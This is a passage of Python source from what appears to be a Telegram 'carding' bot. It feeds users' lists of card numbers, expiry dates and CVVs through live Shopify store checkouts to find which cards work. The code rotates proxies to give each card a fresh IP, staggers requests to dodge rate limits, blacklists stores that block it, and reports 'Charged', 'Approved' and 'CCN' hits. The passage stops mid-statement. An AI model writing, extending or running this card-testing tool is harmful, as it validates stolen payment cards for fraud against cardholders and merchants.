async def process_single_card_parallel(card_line, site_url, product, proxy_data, use_proxy, card_num, total_cards, reuse_session=True):
    """Process a single card - FRESH SESSION FOR EACH CARD.
    
    Returns: (card_line, result, site_url, product, proxy_data)
    Always returns a tuple, never raises exceptions.
    
    Creates a new session for each card and closes it immediately after use
    to prevent session exhaustion and connection overwhelming.
    """
    cc = None
    session = None
    connector = None
    proxy_url = None
    
    try:
        # Parse card
        if '/' in card_line and '|' not in card_line:
            parts = card_line.split('/')
        else:
            parts = card_line.split('|')
        
        if len(parts) < 4:
            return (card_line, ("Error", "Invalid format", card_line[:20]), site_url, product, proxy_data)
        
        cc, mes, ano, cvv = parts[:4]
        # Sanitize values
        cc = ''.join(c for c in cc if c.isdigit())
        mes = ''.join(c for c in mes if c.isdigit()).zfill(2)[:2]
        ano = ''.join(c for c in ano if c.isdigit())[-2:]
        cvv = ''.join(c for c in cvv if c.isdigit())[:4]
        
        if not cc or not cvv or len(cc) < 13:
            return (card_line, ("Error", "Invalid card", card_line[:20]), site_url, product, proxy_data)
        
        masked_cc = f"{cc[:6]}******{cc[-4:]}"
        site_short = site_url.replace('https://', '').replace('http://', '')[:25]
        
        # Log which card we're checking
        log(f"[BATCH] ⚡ Card {card_num}/{total_cards}: {masked_cc} → {site_short}", "INFO")
        
        # Get proxy URL
        if use_proxy and proxy_data:
            proxy_url = get_proxy_url(proxy_data)
        
        # === FRESH SESSION FOR EACH CARD ===
        # Create new connector based on proxy type
        http_proxy = None
        proxy_auth = None
        
        if proxy_url and proxy_url.startswith("socks"):
            # SOCKS proxy - use ProxyConnector
            try:
                connector = ProxyConnector.from_url(proxy_url, limit=30, limit_per_host=15)
            except Exception as e:
                log(f"[SESSION] SOCKS connector failed: {e}", "DEBUG")
                connector = aiohttp.TCPConnector(
                    limit=30,
                    limit_per_host=15,
                    force_close=False,
                    enable_cleanup_closed=True,
                    ttl_dns_cache=300,
                    keepalive_timeout=30,
                )
        elif proxy_url:
            # HTTP proxy - use TCPConnector + proxy parameter
            connector = aiohttp.TCPConnector(
                limit=30,
                limit_per_host=15,
                force_close=False,
                enable_cleanup_closed=True,
                ttl_dns_cache=300,
                keepalive_timeout=30,
            )
            # Get simple proxy URL and auth for HTTP proxies
            if proxy_data:
                http_proxy = get_simple_proxy_url(proxy_data)
                proxy_auth = get_proxy_auth(proxy_data)
        else:
            # Direct connection
            connector = aiohttp.TCPConnector(
                limit=30,
                limit_per_host=15,
                force_close=False,
                enable_cleanup_closed=True,
                ttl_dns_cache=300,
                keepalive_timeout=30,
            )
        
        # Create fresh session with short timeout
        timeout = aiohttp.ClientTimeout(total=45, connect=10, sock_read=25)
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            cookie_jar=aiohttp.CookieJar(unsafe=True)
        )
        
        try:
            # Create gate and process card with fresh session
            gate = ShopifyGateRotator(proxy_url=proxy_url, http_proxy=http_proxy, proxy_auth=proxy_auth)
            result = await gate.process_card_with_session(site_url, product, cc, mes, ano, cvv, session)
        finally:
            # === IMMEDIATELY CLOSE SESSION AFTER USE ===
            try:
                if session and not session.closed:
                    await session.close()
                if connector and not connector.closed:
                    await connector.close()
                log(f"[SESSION] ✓ Closed session for card {card_num}", "DEBUG")
            except Exception as e:
                log(f"[SESSION] Cleanup error: {e}", "DEBUG")
        
        return (card_line, result, site_url, product, proxy_data)
        
    except asyncio.TimeoutError:
        masked_cc = f"{cc[:6]}******{cc[-4:]}" if cc and len(cc) >= 10 else card_line[:15]
        return (card_line, ("Error", "Timeout", masked_cc), site_url, product, proxy_data)
    except Exception as e:
        masked_cc = f"{cc[:6]}******{cc[-4:]}" if cc and len(cc) >= 10 else card_line[:15]
        return (card_line, ("Error", str(e)[:50], masked_cc), site_url, product, proxy_data)
    finally:
        # Extra safety: ensure session is closed even on exception
        try:
            if session and not session.closed:
                await session.close()
            if connector and not connector.closed:
                await connector.close()
        except:
            pass


async def process_single_card(gate, site_url, product, cc, mes, ano, cvv, user_id, chat_id, stats, card_line, quality_tracker):
    """Process a single card - used for parallel processing"""
    try:
        result = await gate.process_card(site_url, product, cc, mes, ano, cvv)
        return (card_line, result, site_url)
    except Exception as e:
        masked_cc = f"{cc[:6]}******{cc[-4:]}" if len(cc) >= 10 else cc
        return (card_line, ("Error", str(e)[:50], masked_cc), site_url)


async def process_user_sh_cards(user_id, chat_id, specific_site=None, cancel_event: Optional[asyncio.Event] = None, job_id: Optional[str] = None):
    """Process cards for a specific user via Shopify using their sites and proxies - ENHANCED VERSION"""
    global user_sh_processing, user_sh_stats, user_progress
    
    # Unique check ID for this user's run - helps trace concurrent checks in logs
    check_id = f"SH_{user_id}_{job_id or 'job'}"
    log(f"[{check_id}] ═══════════ STARTING SHOPIFY CHECK ═══════════", "INFO")
    
    # Load BIN cache at start
    await load_bin_cache()
    
    # Load site quality tracker
    quality_tracker = await get_site_quality_tracker(user_id)
    
    cards = await get_user_cards(user_id)
    proxies = await get_user_proxies(user_id)
    sites = await get_user_shopify_sites(user_id)
    
    if not cards:
        await safe_send_message(chat_id, "❌ No cards in your queue! Send cards first.")
        return
    
    # DEDUPLICATION - Remove duplicate cards
    original_count = len(cards)
    cards, duplicates_removed = deduplicate_cards(cards)
    if duplicates_removed > 0:
        log(f"[SHOPIFY] Removed {duplicates_removed} duplicate cards", "INFO")
        await safe_send_message(chat_id, f"🔄 Removed {duplicates_removed} duplicate cards\n• Processing: {len(cards)} unique cards")
        # Keep queue in sync so resume/progress removal is reliable
        try:
            await save_user_cards(user_id, cards)
        except Exception:
            pass

    # Queue persistence: avoid DB/file writes per-card (too slow for big queues).
    queue_completed = set()
    queue_dirty = 0
    last_queue_save = time.time()
    # For very large queues, checkpoint less frequently
    if len(cards) >= 5000:
        CHECKPOINT_EVERY_N = 250
        CHECKPOINT_EVERY_S = 60
    else:
        CHECKPOINT_EVERY_N = 50
        CHECKPOINT_EVERY_S = 15

    async def checkpoint_queue(force: bool = False):
        nonlocal queue_dirty, last_queue_save
        if not force:
            if queue_dirty < CHECKPOINT_EVERY_N and (time.time() - last_queue_save) < CHECKPOINT_EVERY_S:
                return
        try:
            remaining = [c for c in cards if c not in queue_completed]
            await save_user_cards(user_id, remaining)
            queue_dirty = 0
            last_queue_save = time.time()
        except Exception:
            pass
    
    # If specific site provided, use only that
    if specific_site:
        if not specific_site.startswith("http"):
            specific_site = f"https://{specific_site}"
        sites = [specific_site]
    elif not sites:
        await safe_send_message(chat_id, "❌ No Shopify sites configured! Use /addsh first.")
        return
    
    if not proxies and user_id != OWNER_ID:
        await safe_send_message(chat_id, "❌ No proxies configured! Use /addproxy first.")
        return
    
    use_proxy = len(proxies) > 0
    
    # Initialize stats
    if user_id not in user_sh_stats:
        user_sh_stats[user_id] = {"total": 0, "charged": 0, "approved": 0, "ccn": 0, "insufficient": 0, "declined": 0, "errors": 0}
    
    stats = user_sh_stats[user_id]
    proxy_msg = f"{len(proxies)} proxies" if use_proxy else "NO PROXY (Owner mode)"
    log(f"[SHOPIFY] Starting for user {user_id}: {len(cards)} cards, {len(sites)} sites, {proxy_msg}", "INFO")
    
    # NOTE: progress tracking is handled by LiveCounter per job (multi-job safe)
    
    # Track batch hits for hitkey generation
    batch_hits = []
    
    # Initialize live counter for Shopify
    counter = LiveCounter(len(cards), chat_id, "Shopify Checkout")
    await counter.update(force=True)
    
    processed = 0
    proxy_index = 0
    site_index = 0
    
    # Pre-fetch or cache products for all sites.
    # IMPORTANT: do NOT use only the first proxy for all sites.
    # Rotate proxies per-site so more sites succeed and the checker can truly rotate sites.
    site_products = {}
    total_saved_sites = len(sites)

    # Build a proxy pool for prefetch (rotating proxies expand to many connections)
    if use_proxy and proxies:
        prefetch_proxy_pool = expand_rotating_proxies(proxies, min_pool_size=max(1, total_saved_sites), user_id=user_id)
        random.shuffle(prefetch_proxy_pool)
    else:
        prefetch_proxy_pool = []

    async def _fetch_product_for_site(site_url: str, proxy_data_for_site):
        """Fetch cheapest product for a single site using an optional proxy (safe, always returns)."""
        # Check cache first
        try:
            cached = await get_cached_product(site_url)
            if cached:
                return site_url, cached, None, True
        except Exception:
            pass

        # Try a few times with different proxies (helps when a proxy IP is blocked by a site)
        attempts = 3 if prefetch_proxy_pool else 1
        last_err = None
        for a in range(attempts):
            proxy_data = proxy_data_for_site
            if prefetch_proxy_pool:
                try:
                    proxy_data = prefetch_proxy_pool[(a + (hash(site_url) % len(prefetch_proxy_pool))) % len(prefetch_proxy_pool)]
                except Exception:
                    proxy_data = proxy_data_for_site

            proxy_url = get_proxy_url(proxy_data) if (use_proxy and proxy_data) else None
            http_proxy = get_simple_proxy_url(proxy_data) if (proxy_data and proxy_url and not proxy_url.startswith("socks")) else None
            proxy_auth = get_proxy_auth(proxy_data) if (proxy_data and http_proxy) else None

            connector = None
            if proxy_url and proxy_url.startswith("socks"):
                try:
                    connector = ProxyConnector.from_url(proxy_url, limit=10, limit_per_host=5)
                except Exception:
                    connector = None

            session = None
            try:
                timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=20)
                session = aiohttp.ClientSession(
                    connector=connector,
                    timeout=timeout,
                    cookie_jar=aiohttp.CookieJar(unsafe=True),
                )
                rotator = ShopifyGateRotator(proxy_url=proxy_url, http_proxy=http_proxy, proxy_auth=proxy_auth)
                product, err = await rotator.fetch_cheapest_product(site_url, session)
                if product:
                    try:
                        await cache_product(site_url, product)
                    except Exception:
                        pass
                    return site_url, product, None, False
                last_err = err
            except Exception as e:
                last_err = str(e)[:80]
            finally:
                try:
                    if session and not session.closed:
                        await session.close()
                except Exception:
                    pass
                try:
                    if connector and not connector.closed:
                        await connector.close()
                except Exception:
                    pass

            # Small jitter before retry
            if a < attempts - 1:
                await asyncio.sleep(random.uniform(0.05, 0.25))

        return site_url, None, last_err or "product fetch failed", False

    # Run prefetch with a small concurrency limit (prevents spiking 429s on startup)
    prefetch_sem = asyncio.Semaphore(10)

    async def _prefetch_one(site_url: str, idx: int):
        async with prefetch_sem:
            proxy_data_for_site = prefetch_proxy_pool[idx % len(prefetch_proxy_pool)] if prefetch_proxy_pool else None
            return await _fetch_product_for_site(site_url, proxy_data_for_site)

    # Prefetch all sites
    prefetch_tasks = [_prefetch_one(site_url, idx) for idx, site_url in enumerate(sites)]
    prefetch_results = await asyncio.gather(*prefetch_tasks, return_exceptions=True)
    for res in prefetch_results:
        if isinstance(res, Exception):
            continue
        site_url, product, err, was_cached = res
        if product:
            site_products[site_url] = product
            if was_cached:
                log(f"[SHOPIFY] Using cached product for {site_url}: {product.get('title', 'Unknown')}", "INFO")
            else:
                try:
                    log(f"[SHOPIFY] Found: {product.get('title', 'Unknown')} (${product.get('price', '?')}) @ {site_url}", "SUCCESS")
                except Exception:
                    pass
        else:
            log(f"[SHOPIFY] Failed to get product from {site_url}: {err}", "WARNING")
    
    if not site_products:
        await safe_send_message(chat_id, "❌ Could not fetch products from any site!")
        return
    
    # Sort sites: verified first, exclude blacklisted
    all_product_sites = list(site_products.keys())
    valid_sites = quality_tracker.get_sorted_sites(all_product_sites)
    # Ensure uniqueness (prevents one site being over-selected due to duplicates)
    try:
        valid_sites = list(dict.fromkeys(valid_sites))
    except Exception:
        pass
    
    if not valid_sites:
        await safe_send_message(chat_id, "❌ All sites blacklisted! Add new sites with /addsh or use /shclearblacklist")
        return
    
    # Show quality summary
    quality_summary = quality_tracker.get_quality_summary()
    if quality_summary["verified"] > 0 or quality_summary["blacklisted"] > 0:
        log(f"[QUALITY] Sites: ✅ {quality_summary['verified']} verified, 🚫 {quality_summary['blacklisted']} blacklisted, ⏳ {quality_summary['candidates']} candidates", "INFO")
    
    # Get user's batch size for parallel processing
    batch_size = await get_user_batch_size(user_id)
    
    # Calculate safe max connections based on proxy types
    # Shopify parallelism is capped by usable sites by default (safer). Owner can override with /parallelsh.
    site_cap = GLOBAL_SHOPIFY_SITE_PARALLEL_CAP if GLOBAL_SHOPIFY_SITE_PARALLEL_CAP is not None else len(valid_sites)
    try:
        site_cap = int(site_cap)
    except Exception:
        site_cap = len(valid_sites)
    if site_cap < 1:
        site_cap = 1
    if use_proxy:
        max_proxy_conn, rotating_count, static_count = calculate_max_proxy_connections(proxies)
        # Limit by: requested batch, site cap, AND safe proxy connections
        effective_batch = min(batch_size, site_cap, max_proxy_conn) if max_proxy_conn > 0 else min(batch_size, site_cap)
        proxy_info = f" ({rotating_count} rotating + {static_count} static = {max_proxy_conn} max conn)"
    else:
        effective_batch = min(batch_size, site_cap)
        proxy_info = ""
    
    # Notify user about batch mode
    mode_msg = "Sequential" if effective_batch == 1 else f"{effective_batch}x Parallel"
    cap_info = ""
    if GLOBAL_SHOPIFY_SITE_PARALLEL_CAP is not None:
        cap_info = f" • site-cap: {GLOBAL_SHOPIFY_SITE_PARALLEL_CAP}"
    await safe_send_message(chat_id, f"✅ Products ready from {len(valid_sites)}/{total_saved_sites} sites\n⚡ Mode: *{mode_msg}*{proxy_info}{cap_info}\n🚀 Processing cards...", parse_mode='Markdown')
    
    log(f"[SHOPIFY] Batch mode: {mode_msg} (requested: {batch_size}, sites: {len(valid_sites)}, site_cap: {site_cap}, max_proxy_conn: {max_proxy_conn if use_proxy else 'N/A'})", "INFO")
    
    # Track site error counts during this session - auto-skip after 3 failures
    session_site_errors = {}  # {site_url: error_count}
    session_critical_errors = {}  # {site_url: critical_error_count} (used to avoid instant permanent removals)
    session_blacklist = set()  # Sites blacklisted during this session
    sites_removed = set()  # Sites permanently removed during this session
    instant_dead_sites = set()  # Sites that died DURING batch - skip immediately for remaining cards
    MAX_SITE_ERRORS = 3  # Auto-blacklist after this many errors (for non-critical errors)
    CRITICAL_REMOVE_THRESHOLD = 2  # Require repeated critical evidence before permanent removal
    # Temporary cooldown for throttled sites (e.g. Shopify 429). site_url -> cooldown_until_ts
    site_cooldowns = {}
    COOLDOWN_SECONDS_429 = 60

    # IMPORTANT:
    # When /parallelsh is enabled, the checker may reuse the same sites concurrently.
    # Under high parallelism, transient errors (429/captcha/edge cases) become noisy.
    # To prevent wiping a user's saved sites, disable permanent auto-removal in this mode.
    allow_permanent_site_removal = False # SAFETY: Never auto-delete user sites. False positives are too high.
    
    # Errors that should PERMANENTLY remove site from user's list.
    # Keep this list "high confidence" only; transient errors should NOT delete sites (they cause the check to stop).
    # NOTE: CARD_DECLINED is GOOD (site works, bank declined) - DO NOT REMOVE
    SITE_REMOVE_ERRORS = [
        "NO CHECKOUT TOKEN", "MISSING_SESSION", "NO CHECKOUT",
        "PRODUCT_UNAVAILABLE",
        "SITE MAY HAVE CHANGED", "STRUCTURE CHANGED",
    ]

    SITE_COOLDOWN_ERRORS = [
        "429", "TOO MANY REQUESTS", "RATE LIMIT", "THROTTLED",
        "TIMEOUT", "TIMED OUT",
        "CONNECTION RESET", "CONNECTION REFUSED", "CANNOT CONNECT", "NETWORK",
        "SSL", "CERTIFICATE", "RECORD LAYER",
        "CART_FAILED", "CHECKOUT_FAILED",
        "UNACCEPTABLE_PAYMENT_AMOUNT", "ORDER TOTAL",
        "DELIVERY_LINE_DETAIL_CHANGED", "DELIVERY DETAILS", "DELIVERY_INSUFFICIENT_DELIVERY_OPTIONS",
        "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH", "FLEXIBILITY_TERMS",
        "NO_SHIPPING", "GATEWAY_UNAVAILABLE", "PROPOSED_GATEWAY",
    ]
    
    # Helper function to process batch results - FULLY EXCEPTION-SAFE
    async def handle_batch_result(card_line, result, site_url, product, stats, counter, batch_hits, quality_tracker):
        """Process a single result from batch processing - WITH AUTO SITE REMOVAL
        
        CRITICAL: This function is wrapped in try/except to prevent ANY exception
        from crashing the main processing loop. Telegram API failures, database
        errors, etc. should never stop the check.
        """
        nonlocal sites_removed, instant_dead_sites
        
        try:
            # Queue tracking (debounced persistence)
            nonlocal queue_dirty
            if card_line and card_line not in queue_completed:
                queue_completed.add(card_line)
                queue_dirty += 1
                await checkpoint_queue(force=False)
            
            # Always count as processed
            stats["total"] += 1
            counter.processed += 1
            
            if result is None:
                stats["errors"] += 1
                counter.errors += 1
                return
            
            if isinstance(result, tuple) and len(result) == 3:
                result_type, reason, masked_cc = result
                # Defensive: prevent 3DS/insufficient being mis-saved as charged
                result_type, reason = normalize_shopify_result(result_type, reason)
                result_str = f"{card_line} => {result_type}: {reason} [via {site_url}]"
                
                site_display = site_url.replace('https://', '').replace('http://', '')
                sh_gateway = f"Shopify ({site_display})"
                sh_amount = f"${product['price']}"
                
                if result_type == "Charged":
                    stats["charged"] += 1
                    counter.live += 1
                    counter.charged += 1
                    await save_user_result(user_id, "sh_charged", result_str)
                    await send_result_to_user(chat_id, "Charged", card_line, reason, masked_cc, gateway=sh_gateway, amount=sh_amount)
                    await quality_tracker.record_card_result(site_url, "Charged")
                    await append_to_hit_history(user_id, card_line, "CHARGED", "shopify", source_chat_id=chat_id)
                    batch_hits.append(f"💎 CHARGED | {card_line}")
                elif result_type == "Approved":
                    stats["approved"] += 1
                    counter.live += 1
                    await save_user_result(user_id, "sh_approved", result_str)
                    await send_result_to_user(chat_id, "Approved", card_line, reason, masked_cc, gateway=sh_gateway)
                    await quality_tracker.record_card_result(site_url, "Approved")
                    await append_to_hit_history(user_id, card_line, "APPROVED", "shopify", source_chat_id=chat_id)
                    batch_hits.append(f"✨ APPROVED | {card_line}")
                elif result_type == "CCN":
                    stats["ccn"] += 1
                    counter.live += 1
                    await save_user_result(user_id, "sh_ccn", result_str)
                    await send_result_to_user(chat_id, "CCN", card_line, reason, masked_cc, gateway=sh_gateway)
                    await quality_tracker.record_card_result(site_url, "CCN")
                    await append_to_hit_history(user_id, card_line, "CCN", "shopify", source_chat_id=chat_id)
                    batch_hits.append(f"🔶 CCN | {card_line}")
                elif result_type == "Insufficient":
                    stats["insufficient"] += 1
                    counter.live += 1
                    await save_user_result(user_id, "sh_insufficient", result_str)
                    await send_result_to_user(chat_id, "Insufficient", card_line, reason, masked_cc, gateway=sh_gateway)
                    await quality_tracker.record_card_result(site_url, "Insufficient")
                    await append_to_hit_history(user_id, card_line, "INSUFFICIENT", "shopify", source_chat_id=chat_id)
                    batch_hits.append(f"💸 INSUFFICIENT | {card_line}")
                elif result_type == "Declined":
                    stats["declined"] += 1
                    counter.declined += 1
                    await quality_tracker.record_card_result(site_url, "Declined")
                    
                    # Check if this is actually a SITE issue disguised as decline
                    # Normal CARD_DECLINED = good site, but payment/delivery errors = bad site
                    reason_upper = reason.upper() if reason else ""
                    site_issue_declines = [
                        "UNACCEPTABLE_PAYMENT_AMOUNT", "ORDER TOTAL",
                        "DELIVERY_LINE_DETAIL_CHANGED", "DELIVERY DETAILS",
                        "DELIVERY_INSUFFICIENT_DELIVERY_OPTIONS",
                        "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
                        "PROPOSED_GATEWAY_UNAVAILABLE",
                    ]
                    is_site_issue = any(err in reason_upper for err in site_issue_declines)
                    
                    if is_site_issue and site_url not in sites_removed:
                        site_cooldowns[site_url] = time.time() + COOLDOWN_SECONDS_429
                        site_short = site_url.replace('https://', '').replace('http://', '')[:30]
                        log(f"[SITE-COOLDOWN] ⏳ Cooling down site (transient issue): {site_short} (Reason: {reason[:40]})", "WARNING")
                            
                elif result_type == "Error":
                    stats["errors"] += 1
                    counter.errors += 1
                    
                    # Check if this is a critical error that should REMOVE the site permanently
                    reason_upper = reason.upper() if reason else ""
                    # If site is rate limiting, cooldown it so speed doesn't collapse.
                    if "429" in reason_upper or "RATE_LIMIT" in reason_upper or "TOO MANY" in reason_upper:
                        site_cooldowns[site_url] = time.time() + COOLDOWN_SECONDS_429
                    is_cooldown_error = any(err in reason_upper for err in SITE_COOLDOWN_ERRORS)
                    should_remove = (not is_cooldown_error) and any(err in reason_upper for err in SITE_REMOVE_ERRORS)
                    
                    if should_remove and site_url not in sites_removed:
                        # Mark as "critical candidate" for this session, but avoid instant permanent removal.
                        session_critical_errors[site_url] = session_critical_errors.get(site_url, 0) + 1
                        # Skip this site for the remainder of this run to protect speed.
                        session_blacklist.add(site_url)
                        # NOTE: Do NOT remove from valid_sites - session_blacklist check handles skipping.
                        # Removing from valid_sites prevents recovery when session_blacklist is cleared.
                        site_short = site_url.replace('https://', '').replace('http://', '')[:30]
                        log(f"[SITE-SKIP] ⚠️ Skipping site (critical error): {site_short} (count={session_critical_errors[site_url]}, reason={reason[:50] if reason else 'N/A'})", "WARNING")

                        # Only allow permanent removal in safe mode (no /parallelsh) and after repeated evidence.
                        if allow_permanent_site_removal and session_critical_errors[site_url] >= CRITICAL_REMOVE_THRESHOLD:
                            # INSTANTLY mark as dead so no more cards use this site
                            instant_dead_sites.add(site_url)
                            removed_ok, _ = await remove_user_shopify_site_by_url(user_id, site_url)
                            if removed_ok:
                                sites_removed.add(site_url)
                                await quality_tracker.record_critical_error(site_url, reason[:50] if reason else "CRITICAL_ERROR")
                                log(f"[INSTANT-KILL] 🗑 Removed + blacklisted: {site_short} (Reason: {reason[:30] if reason else 'N/A'})", "WARNING")
                    
                    # Track site errors for session blacklisting
                    session_site_errors[site_url] = session_site_errors.get(site_url, 0) + 1
                    if session_site_errors[site_url] >= MAX_SITE_ERRORS and site_url not in session_blacklist:
                        session_blacklist.add(site_url)
                        # NOTE: Do NOT remove from valid_sites - session_blacklist check handles skipping.
                        # Removing from valid_sites prevents recovery when session_blacklist is cleared.
                        log(f"[QUALITY] 🚫 Auto-skipped site (3+ errors): {site_url}", "WARNING")
        except Exception as e:
            # CRITICAL: Never let this function crash the main loop
            log(f"[SH_{user_id}] ⚠️ handle_batch_result error (continuing): {str(e)[:50]}", "WARNING")
            stats["errors"] += 1
            counter.errors += 1
    
    # Process cards in batches with RETRY support for site errors
    card_index = 0
    total_cards = len(cards)
    retry_queue = []  # Cards that failed with site errors, need retry on different site
    max_retries_per_card = 2  # Max times to retry a card on different sites
    cards_retry_count = {}  # Track retry count per card
    last_site_used = None  # Avoid hammering same site when effective_batch==1
    
    was_cancelled = False
    while card_index < total_cards or retry_queue:
        # Check if cancelled
        if cancel_event and cancel_event.is_set():
            log(f"[SH_{user_id}] ⚠️ CANCELLED (job={job_id})", "WARNING")
            await safe_send_message(chat_id, "⏹ Shopify processing stopped.")
            was_cancelled = True
            break
        
        # Get current batch - prefer new cards, then retries
        cards_needed = effective_batch
        current_batch = []
        batch_sites = []  # Track which site each card will use
        
        # First, add new cards
        while len(current_batch) < cards_needed and card_index < total_cards:
            current_batch.append((cards[card_index], None))  # (card, failed_site)
            card_index += 1
        
        # Then add retry cards if space available
        while len(current_batch) < cards_needed and retry_queue:
            retry_card, failed_site = retry_queue.pop(0)
            current_batch.append((retry_card, failed_site))
        
        if not current_batch:
            break
        
        batch_num = (card_index // effective_batch) + 1
        total_batches = (total_cards + effective_batch - 1) // effective_batch
        retry_count = sum(1 for _, failed in current_batch if failed)
        
        log(f"╔═══════════════════════════════════════════════════════════════╗", "INFO")
        log(f"║  ⚡ BATCH {batch_num}/{total_batches}: Processing {len(current_batch)} cards in parallel" + (f" ({retry_count} retries)" if retry_count else ""), "INFO")
        log(f"╚═══════════════════════════════════════════════════════════════╝", "INFO")
        
        # Create tasks for parallel processing
        tasks = []
        task_info = []  # Track (card_line, site_url, failed_site) for each task
        
        # IMPROVED ROTATION: Shuffle sites and proxies per batch to distribute load
        now_ts = time.time()
        available_sites = []
        for s in valid_sites:
            if s in session_blacklist or s in instant_dead_sites:
                continue
            until = site_cooldowns.get(s)
            if until and until > now_ts:
                continue
            if until and until <= now_ts:
                site_cooldowns.pop(s, None)
            available_sites.append(s)
        if not available_sites:
            log(f"[BATCH] ⚠️ All {len(valid_sites)} sites blacklisted this session!", "WARNING")
            # Try to clear session blacklist and continue with instant_dead only
            log(f"[BATCH] Clearing session blacklist ({len(session_blacklist)} sites) to continue...", "INFO")
            session_blacklist.clear()
            now_ts = time.time()
            available_sites = []
            for s in valid_sites:
                if s in instant_dead_sites:
                    continue
                until = site_cooldowns.get(s)
                if until and until > now_ts:
                    continue
                if until and until <= now_ts:
                    site_cooldowns.pop(s, None)
                available_sites.append(s)
            
            if not available_sites:
                # If everything is on cooldown (429 etc), wait for the soonest cooldown instead of stopping.
                try:
                    future_cds = [ts for ts in site_cooldowns.values() if ts and ts > time.time()]
                    if future_cds:
                        sleep_for = max(1.0, min(60.0, min(future_cds) - time.time()))
                        log(f"[BATCH] ⏳ No sites available (cooldowns). Sleeping {sleep_for:.1f}s then retrying...", "WARNING")
                        # IMPORTANT: roll back consumed cards in this batch.
                        # We already advanced card_index / popped retry_queue to build current_batch.
                        # If we sleep+continue here without undoing that, those cards would be skipped this run.
                        try:
                            # Return retry items to the front of retry_queue (preserve order).
                            retry_items = [(c, fs) for (c, fs) in current_batch if fs]
                            for item in reversed(retry_items):
                                retry_queue.insert(0, item)
                            # Roll back card_index for newly-consumed main-queue cards.
                            consumed_new = sum(1 for (_, fs) in current_batch if not fs)
                            card_index = max(0, card_index - consumed_new)
                        except Exception:
                            pass
                        await asyncio.sleep(sleep_for)
                        continue
                except Exception:
                    pass

                # Otherwise, all sites are effectively dead/unusable
                log(f"[SH_{user_id}] ❌ No usable sites left (instant_dead={len(instant_dead_sites)}). Stopping check.", "ERROR")
                await safe_send_message(chat_id, f"❌ No usable sites left.\n• Removed/instant-dead: {len(instant_dead_sites)}\nAdd more sites with /addsh and try again.")
                break
        
        # Shuffle a copy for this batch to randomize which sites get used
        batch_sites_pool = available_sites.copy()
        random.shuffle(batch_sites_pool)
        
        # Expand & shuffle proxies (only if rotating mode enabled)
        if use_proxy and proxies:
            batch_proxies_pool = expand_rotating_proxies(proxies, min_pool_size=len(current_batch), user_id=user_id)
            random.shuffle(batch_proxies_pool)
        else:
            batch_proxies_pool = []
        
        # Track which sites are assigned this batch to spread load
        batch_site_usage = {}  # site -> count
        
        for i, (card_line, failed_site) in enumerate(current_batch):
            # Select site - avoid failed sites AND session-blacklisted sites for this specific card
            now_ts = time.time()
            card_available_sites = []
            for s in batch_sites_pool:
                if s == failed_site or s in session_blacklist:
                    continue
                until = site_cooldowns.get(s)
                if until and until > now_ts:
                    continue
                if until and until <= now_ts:
                    site_cooldowns.pop(s, None)
                card_available_sites.append(s)
            if not card_available_sites:
                # Fallback: just exclude failed_site
                card_available_sites = [s for s in batch_sites_pool if s != failed_site]
            if not card_available_sites:
                card_available_sites = batch_sites_pool  # Last resort fallback
            if not card_available_sites:
                log(f"[BATCH] ⚠️ No sites available for card!", "WARNING")
                continue
            
            # Pick site with LEAST usage this batch (load balancing)
            # This prevents multiple cards hitting same site simultaneously
            min_usage = min(batch_site_usage.get(s, 0) for s in card_available_sites)
            least_used_sites = [s for s in card_available_sites if batch_site_usage.get(s, 0) == min_usage]
            # When running sequentially, avoid repeating the exact same site if there are alternatives.
            if effective_batch == 1 and last_site_used and len(least_used_sites) > 1:
                least_used_sites = [s for s in least_used_sites if s != last_site_used] or least_used_sites
            current_site = random.choice(least_used_sites)
            batch_site_usage[current_site] = batch_site_usage.get(current_site, 0) + 1
            last_site_used = current_site
            
            current_product = site_products.get(current_site)
            
            if not current_product:
                continue
            
            # Each card gets own proxy connection (fresh IP for rotating proxies)
            if batch_proxies_pool:
                proxy_data = batch_proxies_pool[i] if i < len(batch_proxies_pool) else batch_proxies_pool[i % len(batch_proxies_pool)]
            else:
                proxy_data = None
            
            # Create task for this card
            task = process_single_card_parallel(
                card_line, 
                current_site, 
                current_product, 
                proxy_data, 
                use_proxy,
                card_index - len(current_batch) + i + 1,
                total_cards
            )
            tasks.append(task)
            task_info.append((card_line, current_site, failed_site))
        
        # Execute batch with STAGGERED starts to prevent 429 rate limiting
        if tasks:
            try:
                # Stagger task starts to avoid overwhelming sites
                async def staggered_execute(tasks_list):
                    """Execute tasks with small delays between starts"""
                    running_tasks = []
                    for i, task in enumerate(tasks_list):
                        running_tasks.append(asyncio.create_task(task))
                        # Add small delay between starting each card (prevents 429)
                        if i < len(tasks_list) - 1:
                            await asyncio.sleep(CARD_STAGGER_DELAY)
                    # Wait for all to complete
                    return await asyncio.gather(*running_tasks, return_exceptions=True)
                
                results = await asyncio.wait_for(
                    staggered_execute(tasks),
                    timeout=120  # 2 minute timeout per batch
                )
            except asyncio.TimeoutError:
                log(f"[SHOPIFY] Batch {batch_num} timed out! ({len(tasks)} cards)", "ERROR")
                # Count timed out cards as errors
                for _ in tasks:
                    stats["total"] += 1
                    stats["errors"] += 1
                    counter.errors += 1
                    counter.processed += 1
                results = []
            
            # Process results - check for site errors that should be retried
            for idx, result_tuple in enumerate(results):
                if isinstance(result_tuple, Exception):
                    stats["total"] += 1
                    stats["errors"] += 1
                    counter.errors += 1
                    counter.processed += 1
                    log(f"[BATCH] Card failed with exception: {str(result_tuple)[:50]}", "ERROR")
                    continue
                
                if isinstance(result_tuple, tuple) and len(result_tuple) >= 3:
                    card_line, result, site_url = result_tuple[:3]
                    product = result_tuple[3] if len(result_tuple) > 3 else {"price": "?"}
                    
                    # Check if this is a site error that should be retried
                    if isinstance(result, tuple) and len(result) >= 2:
                        result_type, reason = result[0], result[1]
                        reason_upper = (reason or "").upper()
                        
                        is_permanent_site_error = result_type == "Error" and any(err in reason_upper for err in SITE_REMOVE_ERRORS)

                        is_site_error = (not is_permanent_site_error) and result_type == "Error" and any(err in reason_upper for err in SH_SITE_ERRORS)

                        site_mismatch_declines = [
                            "BRAND_NOT_SUPPORTED", "GATEWAY_UNAVAILABLE", "PROPOSED_GATEWAY",
                            "PAYMENT_FLEXIBILITY_TERMS", "UNACCEPTABLE_PAYMENT_AMOUNT",
                        ]
                        is_site_decline = result_type == "Declined" and any(err in reason_upper for err in site_mismatch_declines)

                        if is_site_error or is_site_decline:
